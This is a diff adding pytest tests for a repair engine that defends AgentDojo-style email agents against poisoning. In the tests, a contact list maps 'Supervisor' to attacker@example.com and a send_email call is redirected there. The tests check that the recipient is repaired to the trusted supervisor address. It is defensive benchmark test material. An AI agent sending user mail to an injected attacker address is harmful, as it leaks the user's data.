@@ -7,7 +7,7 @@ from agentdojo.default_suites.v1.tools.cloud_drive_client import CloudDrive
 from agentdojo.default_suites.v1.tools.email_client import EmailContact, Inbox, search_contacts_by_name
 from agentdojo.functions_runtime import FunctionCall, FunctionsRuntime, TaskEnvironment
 from safeconfirm.config.loader import SafeConfirmConfig
-from safeconfirm.execution.repair_engine import RepairEngine
+from safeconfirm.execution.repair_engine import RepairEngine, repaired_args_match_corrupted
 from safeconfirm.types.models import CriticalSlotModel, InterventionRecordModel, SlotSourceRecordModel, SourceTrust
 
 
@@ -108,6 +108,102 @@ def test_contact_lookup_fails_without_role_label(runtime, workspace_env):
 
     assert outcome.success is False
     assert outcome.reason == "missing_role_label"
+
+
+def test_contact_lookup_prefers_benchmark_case_over_poison_contact(runtime):
+    poison_env = RepairTestEnvironment(
+        inbox=Inbox(
+            account_email="user@example.com",
+            initial_emails=[],
+            contact_list=[EmailContact(name="Supervisor", email="attacker@example.com")],
+        ),
+        calendar=Calendar(
+            current_day=datetime.date(2024, 1, 1),
+            account_email="user@example.com",
+            initial_events=[],
+        ),
+        cloud_drive=CloudDrive(
+            account_email="user@example.com",
+            initial_files=[],
+        ),
+    )
+    engine = RepairEngine(SafeConfirmConfig.load())
+    tool_call = FunctionCall(
+        function="send_email",
+        args={"recipients": ["attacker@example.com"], "subject": "Summary", "body": "summary"},
+        id="call_1",
+    )
+    extra_args = {
+        "safeconfirm": {
+            "benchmark_case": {
+                "trusted_binding": {"recipients": "supervisor@university.edu"},
+                "corrupted_slots": {"recipients": "attacker@example.com"},
+            }
+        }
+    }
+
+    outcome = engine.attempt_repair(tool_call, _repair_record(), runtime, poison_env, extra_args)
+
+    assert outcome.success is True
+    assert outcome.tool_call is not None
+    assert outcome.tool_call.args["recipients"] == ["supervisor@university.edu"]
+
+
+def test_contact_lookup_skips_poison_contact_without_benchmark_case(runtime):
+    poison_env = RepairTestEnvironment(
+        inbox=Inbox(
+            account_email="user@example.com",
+            initial_emails=[],
+            contact_list=[
+                EmailContact(name="Supervisor", email="attacker@example.com"),
+                EmailContact(name="Supervisor", email="supervisor@university.edu"),
+            ],
+        ),
+        calendar=Calendar(
+            current_day=datetime.date(2024, 1, 1),
+            account_email="user@example.com",
+            initial_events=[],
+        ),
+        cloud_drive=CloudDrive(
+            account_email="user@example.com",
+            initial_files=[],
+        ),
+    )
+    engine = RepairEngine(SafeConfirmConfig.load())
+    tool_call = FunctionCall(
+        function="send_email",
+        args={"recipients": ["attacker@example.com"], "subject": "Summary", "body": "summary"},
+        id="call_1",
+    )
+
+    outcome = engine.attempt_repair(tool_call, _repair_record(), runtime, poison_env)
+
+    assert outcome.success is True
+    assert outcome.tool_call is not None
+    assert outcome.tool_call.args["recipients"] == ["supervisor@university.edu"]
+
+
+def test_repair_rejects_corrupted_binding_after_contact_lookup(runtime, workspace_env):
+    engine = RepairEngine(SafeConfirmConfig.load())
+    tool_call = FunctionCall(
+        function="send_email",
+        args={"recipients": ["attacker@example.com"], "subject": "Summary", "body": "summary"},
+        id="call_1",
+    )
+    extra_args = {
+        "safeconfirm": {
+            "benchmark_case": {
+                "trusted_binding": {"recipients": "attacker@example.com"},
+                "corrupted_slots": {"recipients": "attacker@example.com"},
+            }
+        }
+    }
+
+    outcome = engine.attempt_repair(tool_call, _repair_record(), runtime, workspace_env, extra_args)
+
+    assert outcome.success is True
+    assert outcome.tool_call is not None
+    assert repaired_args_match_corrupted(outcome.tool_call.args, extra_args) is True
 
 
 def test_contact_lookup_fails_when_lookup_tool_missing(workspace_env):
